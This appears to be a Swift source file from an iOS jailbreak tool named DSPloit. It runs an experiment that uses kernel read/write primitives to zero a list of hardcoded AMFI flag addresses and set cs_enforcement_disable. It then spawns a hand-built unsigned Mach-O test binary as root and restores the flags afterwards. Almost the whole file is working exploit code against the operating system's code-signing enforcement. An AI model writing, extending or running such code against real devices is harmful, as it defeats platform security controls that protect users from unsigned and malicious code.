//
//  exp_amfi_full_zero.swift
//  DSPloit
//
//  EXPERIMENT: Zero ALL AMFI flags in __DATA (not just 10)
//  Research found 23 additional untouched flags beyond the 10 we already zero.
//  This experiment zeros ALL of them and tests unsigned binary execution.
//

import Foundation

final class ExpAMFIFullZero {
    static let shared = ExpAMFIFullZero()
    private var results: [String] = []
    
    private func log(_ msg: String) {
        results.append(msg)
        globallogger.log("(exp_fullzero) \(msg)")
    }
    
    func runAll() -> [String] {
        results.removeAll()
        
        log("═══════════════════════════════════════════")
        log("  AMFI FULL ZERO — ALL FLAGS EXPERIMENT")
        log("  iOS \(UIDevice.current.systemVersion)")
        log("═══════════════════════════════════════════")
        log("")
        
        guard dspmgr.shared.dsready else {
            log("❌ KRW not active")
            return results
        }
        
        let slide = ds_get_kernel_slide()
        let kernBase = ds_get_kernel_base()
        log("🔍 kernel_base = 0x\(String(kernBase, radix: 16))")
        log("🔍 slide = 0x\(String(slide, radix: 16))")
        log("")
        
        step1_zeroAllFlags(slide: slide)
        step2_testSpawn(slide: slide)
        step3_restore(slide: slide)
        
        log("")
        log("═══════════════════════════════════════════")
        return results
    }
    
    // All AMFI flag addresses found via kernelcache RE (UNSLID)
    // These are in __DATA segment (WRITABLE, not PPL protected)
    private let allFlagAddresses: [(UInt64, Int)] = [
        // 10 flags we already zero (from step 6)
        (0xfffffff00a3301a8, 1),
        (0xfffffff00a3301f8, 1),
        (0xfffffff00a330248, 1),
        (0xfffffff00a330298, 1),
        (0xfffffff00a3302e8, 1),
        (0xfffffff00a330338, 1),
        (0xfffffff00a330388, 1),
        (0xfffffff00a3303d8, 1),
        (0xfffffff00a330430, 1),
        (0xfffffff00a3304a0, 1),
        // 23 NEW untouched flags found via deep RE
        (0xfffffff00a3300d0, 121),  // large value — bitmask?
        (0xfffffff00a330408, 3),    // enforcement level?
        (0xfffffff00a3309f0, 1),
        (0xfffffff00a3309f8, 1),
        (0xfffffff00a330a58, 1),
        (0xfffffff00a330a68, 2),
        (0xfffffff00a330a70, 2),
        (0xfffffff00a330e08, 1),
        (0xfffffff00a330e68, 1),
        (0xfffffff00a330e78, 2),
        (0xfffffff00a330e80, 2),
        (0xfffffff00a330ec8, 3),
        (0xfffffff00a331118, 1),
        (0xfffffff00a331178, 1),
        (0xfffffff00a331188, 2),
        (0xfffffff00a331190, 2),
        (0xfffffff00a3318c8, 1),
        (0xfffffff00a331928, 1),
        (0xfffffff00a331940, 2),
        (0xfffffff00a331988, 1),
        (0xfffffff00a3319e8, 1),
        (0xfffffff00a3319f8, 2),
        (0xfffffff00a331a00, 2),
    ]
    
    private var originalValues: [(UInt64, UInt64)] = []
    
    private func step1_zeroAllFlags(slide: UInt64) {
        log("── Step 1: Zero ALL AMFI flags ──")
        log("  Total flags: \(allFlagAddresses.count) (10 known + 23 new)")
        log("")
        
        originalValues.removeAll()
        var zeroedCount = 0
        var failedCount = 0
        
        for (unslidAddr, expectedVal) in allFlagAddresses {
            let addr = unslidAddr &+ slide
            let current = ds_kread64_safe(addr)
            originalValues.append((addr, current))
            
            if current == 0 {
                log("  0x\(String(addr, radix: 16)) already 0")
                zeroedCount += 1
                continue
            }
            
            // Zero it
            ds_kwrite64(addr, 0)
            let verify = ds_kread64_safe(addr)
            
            if verify == 0 {
                zeroedCount += 1
                if Int(current) != expectedVal {
                    log("  0x\(String(addr, radix: 16)): \(current) → 0 ✅ (was \(current), expected \(expectedVal))")
                } else {
                    log("  0x\(String(addr, radix: 16)): \(current) → 0 ✅")
                }
            } else {
                failedCount += 1
                log("  0x\(String(addr, radix: 16)): WRITE FAILED (still \(verify)) ❌")
            }
        }
        
        log("")
        log("  Result: \(zeroedCount)/\(allFlagAddresses.count) zeroed, \(failedCount) failed")
        
        // Also set cs_enforcement_disable
        let csEnfAddr = ds_kcache_symbol_runtime("_cs_enforcement_disable")
        if csEnfAddr != 0 {
            ds_kwrite64(csEnfAddr, 1)
            log("  cs_enforcement_disable = 1 ✅")
        } else {
            let fallback = ds_get_kernel_base() &+ 0x8B8
            ds_kwrite64(fallback, 1)
            log("  cs_enforcement_disable = 1 (fallback addr)")
        }
        log("")
    }
    
    private func step2_testSpawn(slide: UInt64) {
        log("── Step 2: Test unsigned binary spawn ──")
        
        #if !DISABLE_REMOTECALL
        guard dspmgr.shared.rcready else {
            log("❌ RemoteCall not active — cannot test spawn")
            return
        }
        
        let binary = buildExitBinary()
        let testPath = "/var/jb/tmp/fullzero_test"
        
        log("  Writing + spawning unsigned binary...")
        
        RootExecutor.shared.executeAsRoot(operation: "fullzero_spawn") { rc in
            let mem = rc.trojanMem
            
            let dir = remote_alloc_str(rc, "/var/jb/tmp")
            RootExecutor.rcall(rc, "mkdir", dir, 0o755)
            RootExecutor.rcall(rc, "free", dir)
            
            let pathAddr = remote_alloc_str(rc, testPath)
            let fd = RootExecutor.rcall(rc, "open", pathAddr, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o755)
            guard fd != UInt64(bitPattern: -1) else {
                RootExecutor.rcall(rc, "free", pathAddr)
                return (false, "open failed", 0)
            }
            
            let writeAddr = mem + 0xC00
            binary.withUnsafeBytes { buf in
                rc.remote_write(writeAddr, from: buf.baseAddress!, size: UInt64(binary.count))
            }
            RootExecutor.rcall(rc, "write", fd, writeAddr, UInt64(binary.count))
            RootExecutor.rcall(rc, "close", fd)
            RootExecutor.rcall(rc, "chmod", pathAddr, 0o755)
            
            let pidAddr = mem + 0xA00
            rc[pidAddr].setValue32(0)
            let argvBase = mem + 0xA10
            rc[argvBase].setValue64(pathAddr)
            rc[argvBase + 8].setValue64(0)
            
            let ret = RootExecutor.rcall(rc, "posix_spawn", pidAddr, pathAddr, 0, 0, argvBase, 0)
            let pid = rc[pidAddr].value32()
            RootExecutor.rcall(rc, "free", pathAddr)
            
            return (ret == 0 && pid != 0, "ret=\(ret) pid=\(pid)", UInt64(pid))
        }
        
        // Wait and check
        DispatchQueue.global().asyncAfter(deadline: .now() + 10) { [self] in
            if let result = RootExecutor.shared.lastResult, result.operation == "fullzero_spawn" {
                DispatchQueue.main.async {
                    if result.success {
                        self.log("✅✅✅ UNSIGNED BINARY SPAWNED!")
                        self.log("  pid = \(result.returnValue)")
                        self.log("  FULL JAILBREAK ACCESS CONFIRMED!")
                        self.log("  → Integrate ALL flags into main chain step 6")
                    } else {
                        self.log("❌ Still blocked: \(result.message)")
                        self.log("  AMFI flags alone not sufficient")
                        self.log("  pmap_cs (PPL) enforces independently")
                    }
                }
            }
        }
        
        log("  ⏳ Waiting for result (10s)...")
        #else
        log("❌ DISABLE_REMOTECALL")
        #endif
    }
    
    private func step3_restore(slide: UInt64) {
        log("")
        log("── Step 3: Restore original values ──")
        for (addr, origVal) in originalValues {
            if origVal != 0 {
                ds_kwrite64(addr, origVal)
            }
        }
        log("  All flags restored ✅")
    }
    
    private func buildExitBinary() -> Data {
        var bin = Data()
        let header: [UInt8] = [
            0xCF, 0xFA, 0xED, 0xFE, 0x0C, 0x00, 0x00, 0x01,
            0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00,
            0x02, 0x00, 0x00, 0x00, 0x60, 0x01, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        ]
        bin.append(contentsOf: header)
        var seg = [UInt8](repeating: 0, count: 72)
        seg[0] = 0x19; seg[4] = 0x48
        seg[8] = 0x5F; seg[9] = 0x5F; seg[10] = 0x54; seg[11] = 0x45
        seg[12] = 0x58; seg[13] = 0x54; seg[28] = 0x01
        seg[32] = 0x00; seg[33] = 0x40; seg[40] = 0x00; seg[41] = 0x40
        seg[48] = 0x05; seg[52] = 0x05
        bin.append(contentsOf: seg)
        var thread = [UInt8](repeating: 0, count: 280)
        thread[0] = 0x05; thread[4] = 0x18; thread[5] = 0x01
        thread[8] = 0x06; thread[12] = 0x44
        thread[272] = 0x80; thread[273] = 0x01
        thread[274] = 0x00; thread[275] = 0x00; thread[276] = 0x01
        bin.append(contentsOf: thread)
        while bin.count < 0x180 { bin.append(0) }
        bin.append(contentsOf: [0x00, 0x00, 0x80, 0xD2, 0x30, 0x00, 0x80, 0xD2, 0x01, 0x10, 0x00, 0xD4] as [UInt8])
        while bin.count < 0x4000 { bin.append(0) }
        return bin
    }
}
